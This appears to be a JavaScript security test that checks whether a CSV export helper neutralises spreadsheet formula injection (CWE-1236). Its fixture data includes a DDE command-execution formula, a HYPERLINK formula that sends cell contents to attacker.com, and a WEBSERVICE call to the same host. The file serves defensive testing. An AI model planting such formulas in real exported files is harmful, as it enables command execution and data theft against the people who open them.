/**
 * audit_csv_injection.test.js
 * Automated Security Test Suite for CWE-1236: Improper Neutralization of Formula Elements in a CSV File
 * Validates that dangerous formula trigger characters (=, +, -, @, \t, \r) are properly neutralized.
 */

import * as helper from '../../src/utils/csvRundownHelper.js';

let passed = 0;
let failed = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`  [PASS] ${message}`);
    passed++;
  } else {
    console.error(`  [FAIL] ${message}`);
    failed++;
  }
}

console.log('=== Running Security Audit: CSV Formula Injection (CWE-1236) ===');

// Test Case 1: Malicious session payloads containing Excel command execution formulas
const maliciousItems = [
  {
    session_code: '=cmd|\' /C calc\'!A0',
    start_time: '08:00',
    end_time: '09:00',
    duration_minutes: 60,
    title: '=2+5',
    description: '+10*5 dangerous formula',
    session_type: 'KEYNOTE',
    speaker_name: '-DANGEROUS_SPEAKER',
    pic_team: '@HYPERLINK("http://attacker.com/steal?data="&A1,"Click Here")',
    equipment_checklist: ['\tDangerousTabIndented'],
    stage_cues: '\r\n=WEBSERVICE("http://attacker.com")'
  },
  {
    session_code: 'REG-01',
    start_time: '09:00',
    end_time: '10:00',
    duration_minutes: 60,
    title: 'Normal Benign Session Title',
    description: '100% normal description with standard text',
    session_type: 'CEREMONY',
    speaker_name: 'Budi Santoso',
    pic_team: 'Tim Acara',
    equipment_checklist: ['Mic Wireless 2 Unit'],
    stage_cues: 'Musik pembuka diputar'
  }
];

if (typeof helper.sanitizeCsvFormula === 'function') {
  console.log('\nTesting direct sanitizeCsvFormula function:');
  assert(helper.sanitizeCsvFormula('=1+1') === "'=1+1", "Formula starting with '=' is prefixed with single-quote");
  assert(helper.sanitizeCsvFormula('+1+1') === "'+1+1", "Formula starting with '+' is prefixed with single-quote");
  assert(helper.sanitizeCsvFormula('-1+1') === "'-1+1", "Formula starting with '-' is prefixed with single-quote");
  assert(helper.sanitizeCsvFormula('@SUM(A1:A10)') === "'@SUM(A1:A10)", "Formula starting with '@' is prefixed with single-quote");
  assert(helper.sanitizeCsvFormula('\tDangerous') === "'\tDangerous", "Formula starting with tab '\\t' is prefixed with single-quote");
  assert(helper.sanitizeCsvFormula('Normal Text') === 'Normal Text', 'Benign text is left untouched');
} else {
  console.log('\n[NOTICE] sanitizeCsvFormula is not yet exported from csvRundownHelper.js (Unpatched code).');
}

// Test Export Output
console.log('\nTesting exportRundownItemsToCsv for formula neutralization:');
const exportedCsv = helper.exportRundownItemsToCsv(maliciousItems, 1);
const lines = exportedCsv.split(/\r\n|\n/);

// Check if raw malicious formulas appear unescaped at cell boundaries
const hasRawCmd = lines.some(line => line.includes('"=cmd|\' /C calc\'!A0"'));
const hasRawPlus = lines.some(line => line.includes('"+10*5 dangerous formula"'));
const hasRawHyperlink = lines.some(line => line.includes('"@HYPERLINK('));

if (hasRawCmd || hasRawPlus || hasRawHyperlink) {
  console.log('  [VULNERABILITY CONFIRMED] Raw executable formulas detected without sanitization prefix!');
  failed++;
} else {
  assert(true, 'No raw formula prefixes (=, +, -, @) exposed directly in CSV fields without escaping');
}

console.log(`\n=== CSV Injection Audit Summary: ${passed} Passed, ${failed} Failed ===\n`);

if (failed > 0) {
  process.exit(1);
} else {
  process.exit(0);
}
